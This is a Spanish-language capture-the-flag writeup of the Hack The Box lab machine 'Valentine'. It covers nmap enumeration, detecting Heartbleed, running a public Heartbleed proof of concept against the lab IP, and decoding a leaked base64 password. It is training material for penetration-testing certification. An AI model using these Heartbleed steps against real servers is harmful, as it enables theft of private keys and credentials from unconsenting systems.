---
layout: post
title:  "OSCP Path ~ Valentine de Hack The Box (Necesario VIP)"
description: Writeup de la maquina de HackTheBox llamada VALENTINE siguiendo el PATH para el OSCP
tags: HTB, OSCP Path, Cifrado Decimal, Cifrado Hex, Dovecot, Maquinas Retiradas, Writeup, Hacking
---

# Valentine ~ Hack The Box to OSCP

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10. 79      "
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2021-05-04T17:49:21+00:00; +1s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Lanzamos el script de `http-enum.nse`:
```bash
# nmap --script http-enum -p80,443 10.10.10.79 -oN Webscan                                                                        

PORT    STATE SERVICE
80/tcp  open  http
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
443/tcp open  https
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
```
Vamos a proseguir lanzando scripts de nmap para identificar vulnerabilidades:
```bash
# nmap --script ssl-heartbleed.nse -p22,80,443 10.10.10.79 -oN HeartbleetScan 

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt 
```
# Definicion de Heartbleet
Heartbleed (español:  hemorragia de corazón) es un agujero de seguridad de software en la  biblioteca de código abierto OpenSSL,
solo vulnerable en su versión  1.0.1f, que permite a un atacante leer la memoria de un servidor o un  cliente, permitiéndole por ejemplo,
conseguir las claves privadas SSL de  un servidor.

Podriamos a ver conseguido ver que es vulnerable lanzando el siguiente comando tambien basado en cateegorias de scripts de nmap
```bash
nmap --script “vuln and safe” 10.10.10.79 -oN ScanManchine
```

# Explotando Heartbleet
Exploit funcional de Heartbleet
https://raw.githubusercontent.com/sensepost/heartbleed-poc/master/heartbleed-poc.py
Lo descargamos y Lo usamos de la siguiente forma:

Donde `-n` es para el `numero de ataques/peticiones` 
Y `-f` para `guardar el resultado` en un `archivo` de output.

```bash
─# python heartbleed-poc.py 10.10.10.79 -n 150 -f heardbleed_out.txt
```
Conseguimos sacar atraves del exploit una cadena de nbase 64 que anotamos en hases como contraseña.
```bash
# echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d                 
"heartbleedbelievethehype"
```
Chequeamos la web en las rutas que script `http-enum` nos habia enumerado.
En la ruta `http://10.10.10.79/dev/`
Encontramos un directory listing con dos archivos
```bash
hype_key
notes.txt
```
